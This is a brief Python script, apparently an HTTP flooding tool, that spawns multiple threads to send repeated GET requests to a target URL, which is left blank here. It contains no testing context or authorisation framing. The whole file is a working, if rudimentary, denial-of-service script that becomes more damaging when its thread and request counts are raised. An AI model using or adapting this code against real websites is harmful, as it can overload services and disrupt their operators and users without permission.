import requests
import threading


def flood(url, num_requests) -> None:
	for _ in range(num_requests):
		try:
			response = requests.get(url)
			print(f"Response: {response.status_code}")
		except requests.RequestException as exception:
			print(f"Request failed: {exception}")


def main(url, num_threads, requests_per_thread):
	threads = []

	for _ in range(num_threads):
		thread = threading.Thread(target=flood, args=(url, requests_per_thread))
		threads.append(thread)
		thread.start()

	for thread in threads:
		thread.join()


if __name__ == "__main__":
	url = ''
	main(url, num_threads=10, requests_per_thread=52)
